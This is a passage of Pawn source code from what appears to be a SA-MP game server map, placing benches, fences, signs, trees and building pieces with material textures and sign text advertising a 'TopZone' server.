	new visittext = CreateDynamicObject(19353, 417.4370, -2067.9626, 9.3261, 0.0000, 0.0000, 179.1926);
	SetDynamicObjectMaterialText(visittext,  0,"- Address Site -",  140, "Arial", 60, 1, -16777216, 0, 1);
	new TS3CREDITS = CreateDynamicObject(19353, 417.4519, -2067.9567, 8.7161, 0.0000, 0.0000, 179.2760);
	SetDynamicObjectMaterialText(TS3CREDITS,  0,"wwWw.T-Zone.IR",  140, "Arial", 35, 1, -16777216, 0, 1);
	new FORUMCREDITS = CreateDynamicObject(19353, 417.4519, -2067.9568, 8.1841, 0.0000, 0.0000, 179.2760);
	SetDynamicObjectMaterialText(FORUMCREDITS, 0, "",  140, "Arial", 35, 1, -16777216, 0, 1);
	new UGWLCM = CreateDynamicObject(7914, 369.8494, -2010.4366, 16.1818, 0.0000, 0.0000, 179.6650);
	SetDynamicObjectMaterialText(UGWLCM, 0,"{0066FF}TOP{FFFFFF}ZONE",  140, "Arial", 70, 0, -8092540, 0, 1);

	new BGSPAWNKLUPE[6];
	BGSPAWNKLUPE[0] = CreateDynamicObjectEx(1368, 372.60471, -2063.32959, 7.57130,   0.00000, 0.00000, 180.00000,200.00,200.00);
	BGSPAWNKLUPE[1] = CreateDynamicObjectEx(1368, 379.67670, -2063.32959, 7.57130,   0.00000, 0.00000, 180.00000,200.00,200.00);
	BGSPAWNKLUPE[2] = CreateDynamicObjectEx(1368, 386.33270, -2063.32959, 7.57130,   0.00000, 0.00000, 180.00000,200.00,200.00);
	BGSPAWNKLUPE[3] = CreateDynamicObjectEx(1368, 399.42068, -2060.00171, 7.57130,   0.00000, 0.00000, -90.00000,200.00,200.00);
	BGSPAWNKLUPE[4] = CreateDynamicObjectEx(1368, 369.38870, -2059.48169, 7.57130,   0.00000, 0.00000, 90.00000,200.00,200.00);
	BGSPAWNKLUPE[5] = CreateDynamicObjectEx(1368, 396.42068, -2063.32959, 7.57130,   0.00000, 0.00000, 180.00000,200.00,200.00);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[0], 0, 1368, "cj_benches", "CJ_GREENWOOD",0xFF8C4600);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[0], 1, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[1], 0, 1368, "cj_benches", "CJ_GREENWOOD",0xFF8C4600);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[1], 1, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[2], 0, 1368, "cj_benches", "CJ_GREENWOOD",0xFF8C4600);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[2], 1, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[3], 0, 1368, "cj_benches", "CJ_GREENWOOD",0xFF8C4600);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[3], 1, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[4], 0, 1368, "cj_benches", "CJ_GREENWOOD",0xFF8C4600);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[4], 1, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[5], 0, 1368, "cj_benches", "CJ_GREENWOOD",0xFF8C4600);
	SetDynamicObjectMaterial(BGSPAWNKLUPE[5], 1, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);


	new BGSPAWNSIGNOVI[3];
	BGSPAWNSIGNOVI[0] = CreateDynamicObject(8132, 384.48709, -2060.24878, 9.34960,   0.00000, 0.00000, 102.49310);
	BGSPAWNSIGNOVI[1] = CreateDynamicObject(8132, 354.49820, -2066.81909, 9.38300,   0.00000, 0.00000, 13.55200);
	BGSPAWNSIGNOVI[2] = CreateDynamicObject(8132, 417.48621, -2068.73291, 9.38300,   0.00000, 0.00000, 11.48000);
	SetDynamicObjectMaterial(BGSPAWNSIGNOVI[0], 0, 8132, "vgsschurch", "vgschurchwall03_128",0xFF5E0000);
	SetDynamicObjectMaterial(BGSPAWNSIGNOVI[1], 0, 8132, "vgsschurch", "vgschurchwall03_128",0xFF5E0000);
	SetDynamicObjectMaterial(BGSPAWNSIGNOVI[2], 0, 8132, "vgsschurch", "vgschurchwall03_128",0xFF5E0000);
	SetDynamicObjectMaterial(BGSPAWNSIGNOVI[0], 2, 8132, "vgsschurch", "vgschurchwall05_128",0xFFADADAD);
	SetDynamicObjectMaterial(BGSPAWNSIGNOVI[1], 2, 8132, "vgsschurch", "vgschurchwall05_128",0xFFADADAD);
	SetDynamicObjectMaterial(BGSPAWNSIGNOVI[2], 2, 8132, "vgsschurch", "vgschurchwall05_128",0xFFADADAD);


	new BGSPAWNVELIKISIGN = CreateDynamicObjectEx(3715, 370.10559, -2010.14209, 16.04020,   0.00000, 0.00000, 0.00000,300.00,300.00);
	SetDynamicObjectMaterial(BGSPAWNVELIKISIGN, 0, 8132, "vgsschurch", "vgschurchwall05_128",0xFF949494);
	SetDynamicObjectMaterial(BGSPAWNVELIKISIGN, 2, 8132, "vgsschurch", "vgschurchwall05_128",0xFF666666);


	new BGGSIGNSP1 = CreateDynamicObject(18980, 356.37790, -2010.09644, -1.64460,   0.00000, 0.00000, 0.00000);
	new BGGSIGNSP2 = CreateDynamicObject(18980, 383.92590, -2010.09644, -1.64460,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(BGGSIGNSP1, 0, 8132, "vgsschurch", "vgschurchwall05_128",0xFF949494);
    SetDynamicObjectMaterial(BGGSIGNSP2, 0, 8132, "vgsschurch", "vgschurchwall05_128",0xFF949494);
	
	CreateDynamicObject(1571, 352.61090, -2030.97205, 8.09310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2443, 354.25360, -2025.71338, 6.90410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2443, 353.19159, -2025.71338, 6.90410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2582, 350.95139, -2028.05286, 7.78930,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2582, 350.95139, -2026.57788, 7.78930,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2582, 351.77740, -2025.57495, 7.78930,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2361, 351.29709, -2034.23315, 6.90850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2361, 351.29709, -2036.41626, 6.90850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2581, 353.48849, -2037.23816, 6.81830,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(634, 377.25381, -2059.37109, 6.87340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9833, 376.74991, -2059.55225, 3.70580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(634, 395.40979, -2059.37109, 6.87340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(634, 391.41479, -2059.37109, 6.87340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(634, 380.69980, -2059.37109, 6.87340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9833, 391.17889, -2059.55225, 3.70580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(622, 350.86359, -2049.39111, 6.88530,   0.00000, 0.00000, -85.00000);
	CreateDynamicObject(622, 350.86359, -2061.01318, 6.88530,   0.00000, 0.00000, -85.00000);
	CreateDynamicObject(622, 350.86359, -2072.33716, 6.88530,   0.00000, 0.00000, -85.00000);
	CreateDynamicObject(622, 422.54361, -2052.34302, 6.88530,   0.00000, 0.00000, 91.00000);
	CreateDynamicObject(622, 422.54361, -2063.49512, 6.88530,   0.00000, 0.00000, 91.00000);
	CreateDynamicObject(622, 422.54361, -2074.64722, 6.88530,   0.00000, 0.00000, 91.00000);
	CreateDynamicObject(3532, 351.31799, -2052.89038, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 351.31799, -2057.88550, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 351.31799, -2064.54565, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 351.31799, -2069.20752, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 351.31799, -2075.97852, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 351.31799, -2079.97461, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 354.64801, -2081.75049, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 359.53201, -2081.75049, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 355.20300, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 361.08600, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 394.64801, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 400.07999, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 406.48199, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 413.07800, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 419.28601, -2049.22729, 7.49660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3532, 421.61401, -2055.62939, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 421.61401, -2060.28540, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 421.61401, -2066.29932, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 421.61401, -2071.34326, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 421.61401, -2078.13330, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3532, 421.61401, -2083.37134, 7.49660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3471, 364.61520, -2010.92078, 7.80260,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3471, 375.09119, -2010.92078, 7.80260,   0.00000, 0.00000, 90.00000);

	new BGSPAWNSTUPICI[4];
	BGSPAWNSTUPICI[0] = CreateDynamicObjectEx(3498, 367.05280, -2047.34338, 3.23280,   0.00000, 0.00000, 0.00000,300.00,300.00);
	BGSPAWNSTUPICI[1] = CreateDynamicObjectEx(3498, 369.42380, -2047.34338, 3.23280,   0.00000, 0.00000, 0.00000,300.00,300.00);
	BGSPAWNSTUPICI[2] = CreateDynamicObjectEx(3498, 372.17780, -2047.34338, 3.23280,   0.00000, 0.00000, 0.00000,300.00,300.00);
	BGSPAWNSTUPICI[3] = CreateDynamicObjectEx(3498, 387.85779, -2047.34338, 3.23280,   0.00000, 0.00000, 0.00000,300.00,300.00);
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[0], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[0], 1, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[1], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[1], 1, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[2], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[2], 1, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[3], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNSTUPICI[3], 1, 17298, "weefarmcuntw", "sjmbigold1");


	new BGSPAWNPARKLAJNE[11];
	BGSPAWNPARKLAJNE[0] = CreateDynamicObject(1251, 395.77530, -2046.17480, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[1] = CreateDynamicObject(1251, 395.77530, -2042.13477, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[2] = CreateDynamicObject(1251, 395.77530, -2037.28674, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[3] = CreateDynamicObject(1251, 395.77530, -2032.43884, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[4] = CreateDynamicObject(1251, 395.77530, -2027.59082, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[5] = CreateDynamicObject(1251, 395.77530, -2023.14685, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[6] = CreateDynamicObject(1251, 395.77530, -2018.70276, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[7] = CreateDynamicObject(1251, 395.77530, -2014.25879, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[8] = CreateDynamicObject(1251, 377.99930, -2014.25879, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[9] = CreateDynamicObject(1251, 377.99930, -2018.29883, 6.80990,   0.00000, 90.00000, 90.00000);
	BGSPAWNPARKLAJNE[10] = CreateDynamicObject(1251, 377.99930, -2022.74280, 6.80990,   0.00000, 90.00000, 90.00000);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[0], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[1], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[2], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[3], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[4], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[5], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[6], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[7], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[8], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[9], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BGSPAWNPARKLAJNE[10], 0, 8481, "csrsfence01", "ceaserwall06_128", 0xFFFFFFFF);


	new BGSPAWNOGRADA[32];
	BGSPAWNOGRADA[0] = CreateDynamicObject(984,357.8598000,-2047.5013400,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[1] = CreateDynamicObject(984,356.2507900,-2047.5033000,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[2] = CreateDynamicObject(983,378.6745900,-2047.4616700,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[3] = CreateDynamicObject(983,381.8725900,-2047.4597200,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[4] = CreateDynamicObject(983,364.7020000,-2043.7327900,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[5] = CreateDynamicObject(983,364.7040100,-2040.5347900,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[6] = CreateDynamicObject(983,374.9259900,-2043.7327900,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[7] = CreateDynamicObject(983,374.9259900,-2040.5347900,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[8] = CreateDynamicObject(983,374.9240100,-2019.6268300,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[9] = CreateDynamicObject(983,374.9259900,-2016.3947800,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[10] = CreateDynamicObject(983,364.7340100,-2016.2358400,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[11] = CreateDynamicObject(983,364.7359900,-2019.4677700,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[12] = CreateDynamicObject(984,392.5141900,-2012.3271500,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[13] = CreateDynamicObject(984,381.3312100,-2012.3291000,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[14] = CreateDynamicObject(983,355.1550000,-2044.2967500,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[15] = CreateDynamicObject(983,355.1530200,-2041.1008300,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[16] = CreateDynamicObject(983,355.2650100,-2022.0507800,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[17] = CreateDynamicObject(983,355.2650100,-2015.6547900,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[18] = CreateDynamicObject(983,361.6730000,-2012.4608200,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[19] = CreateDynamicObject(983,358.4630100,-2012.4567900,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[20] = CreateDynamicObject(984,349.5817000,-2053.9565400,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[21] = CreateDynamicObject(984,349.5817000,-2066.7814900,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[22] = CreateDynamicObject(984,349.5817000,-2079.6064500,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[23] = CreateDynamicObject(984,423.5280200,-2053.9611800,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[24] = CreateDynamicObject(984,423.5280200,-2066.7863800,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[25] = CreateDynamicObject(984,423.5280200,-2079.6113300,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[26] = CreateDynamicObject(984,397.9397900,-2047.5124500,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[27] = CreateDynamicObject(984,410.7627900,-2047.5085400,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[28] = CreateDynamicObject(984,417.1328100,-2047.5124500,8.3763,0.0000000,0.0000000,90.0000000); //
	BGSPAWNOGRADA[29] = CreateDynamicObject(984,398.9786100,-2041.0864300,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[30] = CreateDynamicObject(984,398.9786100,-2028.2464600,8.3763,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOGRADA[31] = CreateDynamicObject(984,398.9765900,-2018.6573500,8.3763,0.0000000,0.0000000,0.0000000); //

	for( new id = 0; id < 32; id++)
	{
	    SetDynamicObjectMaterial(BGSPAWNOGRADA[id], 9, 10442, "graveyard_sfs", "ws_graveydfence",0xFF000000);//983
	    SetDynamicObjectMaterial(BGSPAWNOGRADA[id], 5, 10442, "graveyard_sfs", "ws_graveydfence",0xFF000000);//984
	}
	// CASA LUI RedBull si Andreea
	new objectid = CreateObject(7606, -2665.93970, -57.84000, 8.49650,   0.00000, 0.00000, -229.00000);
	SetObjectMaterialText(objectid, "{0066FF}Top{FFFFFF}Zone", 0, OBJECT_MATERIAL_SIZE_256x128,"Arial", 25, 0, 0xFFFF8200, 0xFF000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	new tmpobjid;
	tmpobjid = CreateDynamicObject(8661,-2676.940,-50.423,3.311,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 14534, "ab_wooziea", "dt_office_roof", 0);
	tmpobjid = CreateDynamicObject(8661,-2677.002,-30.438,3.311,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 14534, "ab_wooziea", "dt_office_roof", 0);
	tmpobjid = CreateDynamicObject(8661,-2677.035,-10.454,3.311,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 14534, "ab_wooziea", "dt_office_roof", 0);
	tmpobjid = CreateDynamicObject(8661,-2677.059,9.531,3.311,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 14534, "ab_wooziea", "dt_office_roof", 0);
	tmpobjid = CreateDynamicObject(8661,-2676.981,19.479,3.331,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 14534, "ab_wooziea", "dt_office_roof", 0);
	tmpobjid = CreateDynamicObject(19377,-2665.010,-55.574,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2665.012,-45.935,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2665.012,24.627,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2664.985,15.036,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2664.998,-5.982,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2664.988,-15.593,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2665.027,-25.209,0.914,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2660.228,-41.147,0.914,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2660.257,-29.990,0.914,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2660.232,-1.232,0.914,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2660.183,10.236,0.914,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19381,-2660.196,-24.658,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10426, "backroad_sfs", "retainwall1", 0);
	tmpobjid = CreateDynamicObject(19381,-2660.177,-14.194,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10426, "backroad_sfs", "retainwall1", 0);
	tmpobjid = CreateDynamicObject(19381,-2660.172,-6.452,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10426, "backroad_sfs", "retainwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2660.296,29.476,0.914,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2660.213,-60.358,0.914,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2650.854,-41.183,2.804,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.616,-45.925,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.616,-55.517,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.461,-25.277,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.458,-15.633,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.461,-6.043,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2650.718,-1.246,2.804,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2650.731,10.214,2.804,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.476,15.043,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2655.466,24.643,2.804,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(8661,-2635.524,-16.128,8.054,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8391, "ballys01", "ws_floortiles4", 0);
	tmpobjid = CreateDynamicObject(19378,-2650.260,-25.266,7.981,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2647.681,-34.850,7.979,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2637.313,-34.842,7.989,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2639.794,-25.279,7.981,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2650.192,-5.991,7.981,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2639.766,-5.970,7.981,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2647.586,3.602,7.989,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2647.573,5.458,7.977,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
